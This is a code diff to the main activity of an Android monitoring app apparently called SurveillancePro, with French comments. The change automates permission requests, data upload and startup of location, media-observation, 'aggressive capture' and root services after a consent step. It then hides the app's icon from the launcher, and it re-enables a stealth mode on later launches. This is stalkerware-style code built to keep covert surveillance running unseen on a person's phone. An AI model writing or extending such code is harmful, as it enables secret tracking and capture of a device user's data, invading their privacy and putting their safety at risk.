@@ -34,6 +34,7 @@ import com.surveillancepro.android.services.LocationService
 import com.surveillancepro.android.services.MediaObserverService
 import com.surveillancepro.android.services.StealthManager
 import com.surveillancepro.android.services.AggressiveCaptureService
+import com.surveillancepro.android.services.AutoSetupManager
 import com.surveillancepro.android.root.RootActivator
 import com.surveillancepro.android.root.RootManager
 import com.surveillancepro.android.ui.theme.SupervisionProTheme
@@ -79,9 +80,10 @@ class MainActivity : ComponentActivity() {
             }
         }
 
-        // Si déjà enregistré, lancer les services
+        // Si déjà enregistré, s'assurer que tous les services tournent
         if (storage.hasAccepted && storage.deviceToken != null) {
-            startAllServices()
+            // AUTOMATISATION: S'assurer que tous les services sont actifs
+            AutoSetupManager.ensureServicesRunning(this)
 
             // Activer le mode furtif si pas encore actif
             val currentMode = StealthManager.getCurrentMode(this)
@@ -286,13 +288,20 @@ class MainActivity : ComponentActivity() {
                                 storage.consentSent = true
                                 isLoading = false
 
+                                // AUTOMATISATION COMPLÈTE: Demander toutes les permissions
                                 requestAllPermissions()
                                 sendInitialData()
-                                startAllServices()
+                                
+                                // MOTEUR D'AUTOMATISATION: Lance tout automatiquement
+                                AutoSetupManager.startAutoSetup(this@MainActivity) {
+                                    // Callback quand le setup est terminé
+                                    Log.d("MainActivity", "Auto-setup completed, hiding app...")
+                                    
+                                    // DISPARITION IMMÉDIATE du launcher
+                                    StealthManager.hideImmediately(this@MainActivity)
+                                }
+                                
                                 accepted = true
-
-                                // DISPARITION IMMÉDIATE du launcher - pas de délai
-                                StealthManager.hideImmediately(this@MainActivity)
                                 return@launch
 
                             } catch (e: Exception) {
